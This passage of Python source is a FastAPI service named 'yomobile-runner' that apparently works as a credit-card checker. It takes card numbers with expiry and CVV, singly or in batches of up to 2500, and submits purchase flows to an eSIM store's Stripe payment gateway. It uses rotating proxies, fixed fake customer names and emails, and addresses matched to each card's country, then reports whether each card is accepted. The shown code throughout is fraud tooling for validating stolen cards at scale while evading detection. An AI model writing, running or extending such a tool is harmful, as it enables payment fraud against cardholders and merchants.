                    RETRY_COUNT, RETRY_DELAY, force_proxy=force_proxy,
                )
                if collect_steps:
                    steps.append({
                        "step": "wallet_payment_sheet",
                        "status": r.get("status"), "ok": r.get("ok"),
                        "body_preview": _preview(r.get("body"), 200),
                    })
                if r.get("ok"):
                    final_success = True
                    final_code = _extract_error_code(r.get("body")) or "ORDER_PLACED"
                    async with _METRICS_LOCK:
                        _METRICS["payment_sheet"] += 1
                else:
                    final_code = _extract_error_code(r.get("body")) or "CARD_DECLINED"

    finally:
        for c in client_cache.values():
            try:
                await c.aclose()
            except Exception:
                pass

    elapsed_ms = int((time.time() - t0) * 1000)
    response_obj = classify_yo_response(
        success=final_success,
        response_body={"code": final_code} if final_code else None,
        gateway="yo Payments", price=price, card=card_str, elapsed_ms=elapsed_ms,
    )

    async with _METRICS_LOCK:
        _METRICS["single_runs"] += 1
        _METRICS["total"] += 1
        if response_obj["Status"]:
            _METRICS["success"] += 1
        else:
            _METRICS["failed"] += 1
    _LATENCIES.append(elapsed_ms)

    response_obj["Proxy"] = "Live" if force_proxy else "None"
    response_obj["current_order_id"] = current_order_id
    if collect_steps:
        response_obj["steps"] = steps
    return response_obj


# ═══════════════════════════════════════════════════════════════════════════
# Root
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/")
async def root():
    proxies_count = len(_proxy_rotator.proxies) if _proxy_rotator else 0
    return {
        "service": "yomobile-runner",
        "version": "1.9.0",
        "base_url": BASE_URL,
        "store_url": STORE_URL,
        "stripe_url": STRIPE_URL,
        "proxy_mode": USE_STORE_PROXY,
        "auto_country": AUTO_COUNTRY,
        "egypt": {
            "country_id": EG_COUNTRY_ID,
            "product_id": EG_PRODUCT_ID,
        },
        "session": {
            "has_auth_token": bool(_session.auth_token),
            "has_refresh_token": bool(_session.refresh_token),
            "device_id_prefix": _session.device_id[:8] + "..." if _session.device_id else None,
            "stripe_order_id": _session.stripe_order_id or None,
            "token_remaining_sec": _session.token_remaining(),
            "is_fresh": _session.is_fresh(),
        },
        "refresh_loop": {
            "enabled": _refresh_task is not None and not _refresh_task.done(),
            "interval_sec": SESSION_LOOP_INTERVAL,
            "margin_sec": SESSION_REFRESH_MARGIN,
        },
        "queries_count": len(build_queries()),
        "proxy_pool_size": proxies_count,
        "main_endpoints": [
            "GET  /yo?cc=X&proxy=Y",
            "GET  /yo/check?card=X&force_destructive=true",
            "POST /yo/check {card, force_destructive: true}",
            "POST /yo/batch {cards: [...], force_destructive: true}",
            "POST /batch {cards: [...]}",
            "GET  /esim/egypt",
            "GET  /session/status",
            "GET  /session/refresh",
        ],
    }


# ═══════════════════════════════════════════════════════════════════════════
# Session endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/session/status")
async def session_status(request: Request):
    _check_auth(request)
    exp = _jwt_exp(_session.auth_token) if _session.auth_token else None
    return JSONResponse(content={
        "has_auth_token": bool(_session.auth_token),
        "has_refresh_token": bool(_session.refresh_token),
        "has_device_id": bool(_session.device_id),
        "has_stripe_order_id": bool(_session.stripe_order_id),
        "customer_profile_id": _session.customer_profile_id or None,
        "stripe_order_id": _session.stripe_order_id or None,
        "is_fresh": _session.is_fresh(),
        "token_remaining_sec": _session.token_remaining(),
        "token_exp_unix": exp,
        "refresh_margin_sec": SESSION_REFRESH_MARGIN,
        "refresh_loop_running": _refresh_task is not None and not _refresh_task.done(),
        "last_refresh_attempt_ago_sec": (
            int(time.time() - _session.last_refresh_attempt)
            if _session.last_refresh_attempt else None
        ),
        "proxy_mode": USE_STORE_PROXY,
    })


@app.get("/session/refresh")
async def session_refresh(request: Request, force: bool = FastQuery(True)):
    _check_auth(request)
    client = await _get_client()
    ok, err = await _fetch_session(
        client,
        cookie_header=_session.cookie_header(),
        force=force,
    )
    return JSONResponse(content={
        "ok": ok,
        "error": err or None,
        "has_auth_token": bool(_session.auth_token),
        "token_remaining_sec": _session.token_remaining(),
        "is_fresh": _session.is_fresh(),
    }, status_code=200 if ok else 500)


@app.post("/session/set-order")
async def session_set_order(request: Request):
    _check_auth(request)
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    order_id = body.get("order_id")
    if not order_id:
        raise HTTPException(status_code=400, detail="Missing 'order_id'")
    _session.set_stripe_order_id(str(order_id))
    return JSONResponse(content={
        "ok": True,
        "stripe_order_id": _session.stripe_order_id,
    })


# ═══════════════════════════════════════════════════════════════════════════
# Egypt endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/esim/egypt")
async def esim_egypt(request: Request):
    _check_auth(request)
    return JSONResponse(content={
        "ok": True,
        "country": "EG",
        "country_id": EG_COUNTRY_ID,
        "product_id": EG_PRODUCT_ID,
        "source": "hardcoded",
    })


@app.get("/esim/resolve")
async def esim_resolve(
    request: Request,
    country: str = FastQuery("EG"),
    refresh: bool = FastQuery(False),
):
    _check_auth(request)
    if country.upper() == "EG":
        return JSONResponse(content={
            "ok": True,
            "country": "EG",
            "country_id": EG_COUNTRY_ID,
            "product_id": EG_PRODUCT_ID,
            "source": "hardcoded",
        })
    return JSONResponse(
        status_code=404,
        content={"ok": False, "error": "only EG supported in v1.9.0"},
    )


@app.get("/esim/cache/clear")
async def esim_cache_clear(request: Request):
    _check_auth(request)
    return JSONResponse(content={"ok": True, "message": "no cache in v1.9.0"})


# ═══════════════════════════════════════════════════════════════════════════
# GET /yo
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/yo")
async def yo_direct(
    request: Request,
    cc: str = FastQuery(..., description="Card: CC|MM|YYYY|CVV"),
    proxy: Optional[str] = FastQuery(None),
    country: Optional[str] = FastQuery(None),
    payment_method: str = FastQuery("stripe", description="sheet|direct|stripe"),
    create_order: bool = FastQuery(True),
    price: float = FastQuery(10.0),
):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")

    try:
        card_data = parse_cc_string(cc)
    except ValueError as e:
        return JSONResponse(content={
            "Gateway": "yo Payments", "Price": price,
            "Proxy": "Live" if proxy else "None",
            "Response": "INVALID_CARD_FORMAT", "Status": False,
            "cc": cc, "Elapsed": "0.00s", "error": str(e),
        }, status_code=400)

    force_proxy = _norm_proxy(proxy) if proxy else None
    addr_country = (country.upper() if country
                    else _detect_country_from_card(card_data["cc"]))
    address = _pick_address(addr_country)

    body: Dict[str, Any] = {
        "card": cc, "price": price,
        "payment_method": payment_method, "create_order": create_order,
    }
    if proxy:
        body["proxy"] = proxy

    ctx = _extract_ctx(request, body)
    overrides = _extract_overrides(request, body)
    overrides["customer_email"] = FIXED_EMAIL
    overrides["customer_first_name"] = FIXED_FIRST_NAME
    overrides["customer_last_name"] = FIXED_LAST_NAME

    result = await _run_yo_flow(
        card_str=cc, price=price,
        payment_method=payment_method, create_order=create_order,
        override_order_id=None, ctx=ctx, overrides=overrides,
        force_proxy=force_proxy, collect_steps=False, address=address,
    )

    elapsed_ms = result.get("ElapsedMs", 0)
    return JSONResponse(content={
        "Gateway": result["Gateway"],
        "Price": result["Price"],
        "Proxy": result["Proxy"],
        "Response": result["Response"],
        "Status": result["Status"],
        "cc": result["cc"],
        "Elapsed": f"{elapsed_ms / 1000:.2f}s",
        "Address": address,
        "Email": FIXED_EMAIL,
        "OrderID": result.get("current_order_id", ""),
    })


# ═══════════════════════════════════════════════════════════════════════════
# Queries
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/queries")
async def list_queries(request: Request):
    _check_auth(request)
    queries = build_queries()
    return JSONResponse(content={
        "total": len(queries),
        "destructive_count": sum(1 for q in queries if q.destructive),
        "via_proxy_count": sum(1 for q in queries if q.via_store_proxy),
        "queries": [q.to_dict() for q in queries],
    })


@app.get("/queries/{query_name}")
async def query_details(query_name: str, request: Request):
    _check_auth(request)
    queries = build_queries()
    target = next((q for q in queries if q.name == query_name), None)
    if target is None:
        raise HTTPException(status_code=404, detail=f"Unknown query '{query_name}'")
    return JSONResponse(content=target.to_dict())


# ═══════════════════════════════════════════════════════════════════════════
# Run endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/run")
async def run_all_get(
    request: Request,
    parallel: bool = FastQuery(True),
    concurrency: int = FastQuery(10, ge=1, le=MAX_CONCURRENCY),
    skip_destructive: bool = FastQuery(True),
    include_body: bool = FastQuery(False),
    only: Optional[str] = FastQuery(None),
):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")

    ctx = _extract_ctx(request)
    overrides = _extract_overrides(request)
    queries = build_queries(overrides)

    if skip_destructive:
        queries = [q for q in queries if not q.destructive]
    if only:
        wanted = {n.strip() for n in only.split(",") if n.strip()}
        queries = [q for q in queries if q.name in wanted]
        if not queries:
            raise HTTPException(status_code=404, detail="No matching queries")

    started = time.time()
    results = await run_queries(
        queries, ctx, _proxy_rotator, _proxy_cb,
        parallel=parallel, concurrency=concurrency,
        retry=RETRY_COUNT, retry_delay=RETRY_DELAY,
    )
    elapsed = time.time() - started

    async with _METRICS_LOCK:
        _METRICS["runs"] += 1

    if not include_body:
        for r in results:
            r.pop("body", None)
            r.pop("cookies", None)

    ok = sum(1 for r in results if r["ok"])
    failed = len(results) - ok

    return JSONResponse(content={
        "ok": True, "total": len(results), "succeeded": ok, "failed": failed,
        "elapsed_ms": int(elapsed * 1000),
        "results": results,
    })


@app.get("/run/{query_name}")
async def run_single_get(
    query_name: str,
    request: Request,
    include_body: bool = FastQuery(False),
    force_destructive: bool = FastQuery(False),
):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")

    ctx = _extract_ctx(request)
    overrides = _extract_overrides(request)
    queries = build_queries(overrides)

    target = next((q for q in queries if q.name == query_name), None)
    if target is None:
        raise HTTPException(status_code=404, detail=f"Unknown query '{query_name}'")
    if target.destructive and not force_destructive:
        raise HTTPException(status_code=403, detail=f"Query '{query_name}' is destructive")

    client_cache: Dict[str, httpx.AsyncClient] = {}
    try:
        result = await execute_query(
            target, ctx, _proxy_rotator, _proxy_cb, client_cache,
            RETRY_COUNT, RETRY_DELAY,
        )
    finally:
        for c in client_cache.values():
            try:
                await c.aclose()
            except Exception:
                pass

    if not include_body:
        result.pop("body", None)
        result.pop("cookies", None)

    return JSONResponse(content={"ok": bool(result.get("ok")), "result": result})


# ═══════════════════════════════════════════════════════════════════════════
# /yo/check (POST)
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/yo/check")
async def yo_check_post(request: Request):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")

    try:
        body = await request.json()
    except Exception:
        body = {}

    if not body.get("force_destructive", False):
        raise HTTPException(status_code=403,
                             detail="Set force_destructive=true")

    card = str(body.get("card") or "")
    price = float(body.get("price") or 10.0)
    payment_method = str(body.get("payment_method") or "stripe").lower()
    create_order = bool(body.get("create_order", True))
    order_id_override = body.get("order_id")
    proxy_raw = body.get("proxy")
    force_proxy = _norm_proxy(proxy_raw) if proxy_raw else None

    country_override = body.get("country")
    if country_override:
        address = _pick_address(str(country_override).upper())
    else:
        try:
            card_data = parse_cc_string(card)
            address = _pick_address(_detect_country_from_card(card_data["cc"]))
        except ValueError:
            address = _pick_address("EG")

    ctx = _extract_ctx(request, body)
    overrides = _extract_overrides(request, body)
    overrides["customer_email"] = FIXED_EMAIL
    overrides["customer_first_name"] = FIXED_FIRST_NAME
    overrides["customer_last_name"] = FIXED_LAST_NAME
    if order_id_override:
        overrides["esim_order_id"] = str(order_id_override)

    result = await _run_yo_flow(
        card_str=card, price=price, payment_method=payment_method,
        create_order=create_order, override_order_id=order_id_override,
        ctx=ctx, overrides=overrides, force_proxy=force_proxy,
        collect_steps=True, address=address,
    )
    return JSONResponse(content=result)


# ═══════════════════════════════════════════════════════════════════════════
# /yo/check (GET)
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/yo/check")
async def yo_check_get(
    request: Request,
    card: str = FastQuery(..., description="Card: CC|MM|YYYY|CVV"),
    price: float = FastQuery(10.0),
    proxy: Optional[str] = FastQuery(None),
    payment_method: str = FastQuery("stripe"),
    create_order: bool = FastQuery(True),
    order_id: Optional[str] = FastQuery(None),
    country: Optional[str] = FastQuery(None),
    force_destructive: bool = FastQuery(False),
):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")
    if not force_destructive:
        raise HTTPException(status_code=403, detail="Use force_destructive=true")

    force_proxy = _norm_proxy(proxy) if proxy else None

    try:
        card_data = parse_cc_string(card)
    except ValueError as e:
        return JSONResponse(content={
            "Gateway": "yo Payments", "Price": price,
            "Proxy": "Live" if force_proxy else "None",
            "Response": "INVALID_CARD_FORMAT", "Status": False,
            "cc": card, "Elapsed": "0.00s", "error": str(e),
        }, status_code=400)

    addr_country = (country.upper() if country
                    else _detect_country_from_card(card_data["cc"]))
    address = _pick_address(addr_country)

    body: Dict[str, Any] = {
        "force_destructive": True, "card": card, "price": price,
        "payment_method": payment_method, "create_order": create_order,
    }
    if proxy:
        body["proxy"] = proxy
    if order_id:
        body["order_id"] = order_id

    ctx = _extract_ctx(request, body)
    overrides = _extract_overrides(request, body)
    overrides["customer_email"] = FIXED_EMAIL
    overrides["customer_first_name"] = FIXED_FIRST_NAME
    overrides["customer_last_name"] = FIXED_LAST_NAME
    if order_id:
        overrides["esim_order_id"] = str(order_id)

    result = await _run_yo_flow(
        card_str=card, price=price, payment_method=payment_method,
        create_order=create_order, override_order_id=order_id,
        ctx=ctx, overrides=overrides, force_proxy=force_proxy,
        collect_steps=False, address=address,
    )

    elapsed_ms = result.get("ElapsedMs", 0)
    return JSONResponse(content={
        "Gateway": result["Gateway"],
        "Price": result["Price"],
        "Proxy": result["Proxy"],
        "Response": result["Response"],
        "Status": result["Status"],
        "cc": result["cc"],
        "Elapsed": f"{elapsed_ms / 1000:.2f}s",
    })


# ═══════════════════════════════════════════════════════════════════════════
# /yo/batch
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/yo/batch")
async def yo_batch(request: Request):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")

    try:
        data = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON")

    cards = data.get("cards", [])
    if not cards or not isinstance(cards, list):
        raise HTTPException(status_code=400, detail="Missing 'cards'")
    if len(cards) > 100:
        raise HTTPException(status_code=400, detail="Max 100 cards")

    price = float(data.get("price", 10.0))
    proxy_raw = data.get("proxy")
    force_proxy = _norm_proxy(proxy_raw) if proxy_raw else None
    payment_method = str(data.get("payment_method", "stripe")).lower()
    create_order = bool(data.get("create_order", True))
    force_destructive = bool(data.get("force_destructive", False))

    if not force_destructive:
        raise HTTPException(status_code=403, detail="Set force_destructive=true")

    ctx = _extract_ctx(request, data)
    base_overrides = _extract_overrides(request, data)
    base_overrides["customer_email"] = FIXED_EMAIL
    base_overrides["customer_first_name"] = FIXED_FIRST_NAME
    base_overrides["customer_last_name"] = FIXED_LAST_NAME

    sem = asyncio.Semaphore(max(1, BATCH_CONCURRENCY))

    async def _run_one(card_str: str) -> Dict[str, Any]:
        async with sem:
            try:
                try:
                    card_data = parse_cc_string(card_str)
                    address = _pick_address(_detect_country_from_card(card_data["cc"]))
                except ValueError:
                    address = _pick_address("EG")

                res = await _run_yo_flow(
                    card_str=card_str, price=price,
                    payment_method=payment_method, create_order=create_order,
                    override_order_id=None, ctx=ctx,
                    overrides=dict(base_overrides),
                    force_proxy=force_proxy, collect_steps=False,
                    address=address,
                )
                elapsed_ms = res.get("ElapsedMs", 0)
                return {
                    "Gateway": res["Gateway"], "Price": res["Price"],
                    "Proxy": res["Proxy"], "Response": res["Response"],
                    "Status": res["Status"], "cc": res["cc"],
                    "Elapsed": f"{elapsed_ms / 1000:.2f}s",
                    "OrderID": res.get("current_order_id", ""),
                }
            except Exception as ex:
                return {
                    "Gateway": "yo Payments", "Price": price,
                    "Proxy": "Live" if force_proxy else "None",
                    "Response": "ERROR", "Status": False,
                    "cc": card_str, "error": str(ex)[:200],
                }

    results = await asyncio.gather(*[_run_one(c) for c in cards])
    return JSONResponse(content=list(results))


# ═══════════════════════════════════════════════════════════════════════════
# /batch
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/batch")
async def main77_batch(request: Request):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")

    try:
        data = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid JSON")

    cards = data.get("cards", [])
    if not cards or not isinstance(cards, list):
        raise HTTPException(status_code=400, detail="Missing 'cards'")
    if len(cards) > 2500:
        raise HTTPException(status_code=400, detail="Max 2500 cards")

    price = float(data.get("price", 10.0))
    payment_method = str(data.get("payment_method", "stripe")).lower()
    create_order = bool(data.get("create_order", True))

    proxy_list = data.get("proxies") or []
    if not proxy_list and data.get("proxy"):
        proxy_list = [data["proxy"]]
    normalized_proxies = [_norm_proxy(p) for p in proxy_list] if proxy_list else []

    ctx = _extract_ctx(request, data)
    base_overrides = _extract_overrides(request, data)
    base_overrides["customer_email"] = FIXED_EMAIL
    base_overrides["customer_first_name"] = FIXED_FIRST_NAME
    base_overrides["customer_last_name"] = FIXED_LAST_NAME

    sem = asyncio.Semaphore(max(1, BATCH_CONCURRENCY))

    async def _run_one(idx: int, card_str: str) -> Dict[str, Any]:
        async with sem:
            force_proxy = None
            if normalized_proxies:
                force_proxy = normalized_proxies[idx % len(normalized_proxies)]
            try:
                try:
                    card_data = parse_cc_string(card_str)
                    address = _pick_address(_detect_country_from_card(card_data["cc"]))
                except ValueError:
                    address = _pick_address("EG")

                res = await _run_yo_flow(
                    card_str=card_str, price=price,
                    payment_method=payment_method, create_order=create_order,
                    override_order_id=None, ctx=ctx,
                    overrides=dict(base_overrides),
                    force_proxy=force_proxy, collect_steps=False,
                    address=address,
                )
                elapsed_ms = res.get("ElapsedMs", 0)
                return {
                    "Gateway": res["Gateway"], "Price": res["Price"],
                    "Proxy": res["Proxy"], "Response": res["Response"],
                    "Status": str(res["Status"]).lower(),
                    "CC": res["cc"],
                    "Elapsed": round(elapsed_ms / 1000.0, 2),
                }
            except Exception as ex:
                return {
                    "Gateway": "yo Payments", "Price": price,
                    "Proxy": "Live" if force_proxy else "None",
                    "Response": "ERROR", "Status": "false",
                    "CC": card_str, "Elapsed": 0.0,
                    "error": str(ex)[:200],
                }

    results = await asyncio.gather(*[_run_one(i, c) for i, c in enumerate(cards)])
    return JSONResponse(content=list(results))


# ═══════════════════════════════════════════════════════════════════════════
# /delcache
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/delcache")
async def delcache_get(request: Request):
    _check_auth(request)
    return JSONResponse(content={"status": "success", "cleared": 0, "note": "no cache"})


@app.post("/delcache")
async def delcache_post(request: Request):
    _check_auth(request)
    return JSONResponse(content={"status": "success", "cleared": 0, "note": "no cache"})


# ═══════════════════════════════════════════════════════════════════════════
# Metrics / Health / Status
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/metrics")
async def metrics_endpoint(request: Request):
    _check_auth(request)
    async with _METRICS_LOCK:
        snapshot = dict(_METRICS)
    lat = sorted(_LATENCIES)
    if lat:
        n = len(lat)
        snapshot["avg_ms"] = int(sum(lat) / n)
        snapshot["p50_ms"] = lat[int(n * 0.50)]
        snapshot["p95_ms"] = lat[min(int(n * 0.95), n - 1)]
        snapshot["p99_ms"] = lat[min(int(n * 0.99), n - 1)]
        snapshot["max_ms"] = lat[-1]
    total = snapshot.get("total", 0)
    if total > 0:
        snapshot["success_pct"] = round(snapshot.get("success", 0) * 100.0 / total, 2)
        snapshot["failed_pct"] = round(snapshot.get("failed", 0) * 100.0 / total, 2)
    snapshot["session_fresh"] = _session.is_fresh()
    snapshot["session_remaining_sec"] = _session.token_remaining()
    snapshot["refresh_loop_running"] = _refresh_task is not None and not _refresh_task.done()
    return JSONResponse(content=snapshot)


@app.get("/health")
async def health_endpoint():
    checks = {
        "client_ready": _http_client is not None and not _http_client.is_closed,
        "proxy_rotator_ready": _proxy_rotator is not None,
        "session_has_auth": bool(_session.auth_token),
        "session_fresh": _session.is_fresh(),
        "session_remaining_sec": _session.token_remaining(),
        "refresh_loop_running": _refresh_task is not None and not _refresh_task.done(),
        "stripe_pk_configured": bool(STRIPE_PUBLISHABLE_KEY),
        "egypt_configured": bool(EG_COUNTRY_ID and EG_PRODUCT_ID),
    }
    try:
        asyncio.get_running_loop()
        checks["loop_alive"] = True
    except RuntimeError:
        checks["loop_alive"] = False
    all_ok = checks["client_ready"] and checks["loop_alive"]
    return JSONResponse(
        content={"healthy": all_ok, "checks": checks},
        status_code=200 if all_ok else 503,
    )


@app.get("/status")
async def status_endpoint(request: Request):
    _check_auth(request)
    return JSONResponse(content={
        "status": "online", "version": "1.9.0",
        "base_url": BASE_URL, "store_url": STORE_URL,
        "egypt": {"country_id": EG_COUNTRY_ID, "product_id": EG_PRODUCT_ID},
        "session": {
            "has_auth": bool(_session.auth_token),
            "has_refresh": bool(_session.refresh_token),
            "has_stripe_order": bool(_session.stripe_order_id),
            "is_fresh": _session.is_fresh(),
            "token_remaining_sec": _session.token_remaining(),
        },
        "refresh_loop": {
            "running": _refresh_task is not None and not _refresh_task.done(),
            "interval_sec": SESSION_LOOP_INTERVAL,
            "margin_sec": SESSION_REFRESH_MARGIN,
        },
        "metrics": dict(_METRICS),
    })


# ═══════════════════════════════════════════════════════════════════════════
# Proxy management
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/proxy/status")
async def proxy_status(request: Request):
    _check_auth(request)
    if _proxy_rotator is None or _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")
    snapshot = _proxy_cb.snapshot()
    sample = [_mask_proxy(p) for p in _proxy_rotator.proxies[:5]]
    return JSONResponse(content={
        "pool_size": len(_proxy_rotator.proxies),
        "pool_file": PROXY_FILE,
        "sticky_enabled": _proxy_rotator.sticky_enabled,
        "sticky_sessions": len(_proxy_rotator.sticky),
        "cb_threshold": _proxy_cb.threshold,
        "cb_cooldown_sec": _proxy_cb.cooldown,
        "sample": sample,
        "stats": snapshot,
    })


@app.post("/proxy/reload")
async def proxy_reload(request: Request):
    _check_auth(request)
    global _proxy_rotator, _proxy_cb
    proxies = _load_proxies(PROXY_FILE) if PROXY_FILE else []
    old_cb = _proxy_cb
    new_cb = ProxyCircuitBreaker(threshold=CB_THRESHOLD, cooldown=CB_COOLDOWN)
    new_rotator = ProxyRotator(proxies, new_cb, sticky=True)
    if old_cb is not None:
        for k, v in old_cb.stats.items():
            new_cb.stats[k] = v
        for k, v in old_cb.dead_until.items():
            new_cb.dead_until[k] = v
    _proxy_cb = new_cb
    _proxy_rotator = new_rotator
    return JSONResponse(content={
        "ok": True,
        "pool_size": len(proxies),
        "message": f"Reloaded {len(proxies)} proxies",
    })


@app.post("/proxy/reset")
async def proxy_reset(request: Request):
    _check_auth(request)
    if _proxy_cb is None:
        raise HTTPException(status_code=503, detail="Service not ready")
    async with _proxy_cb.lock:
        _proxy_cb.stats.clear()
        _proxy_cb.dead_until.clear()
    if _proxy_rotator is not None:
        async with _proxy_rotator.lock:
            _proxy_rotator.sticky.clear()
            _proxy_rotator.sticky_ts.clear()
            _proxy_rotator.index = 0
    return JSONResponse(content={
        "ok": True,
        "message": "Proxy stats and sticky sessions reset",
    })


# ═══════════════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    port = int(os.environ.get("PORT", _v("PORT", "8000")))
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        workers=1,
        log_level="info",
    )
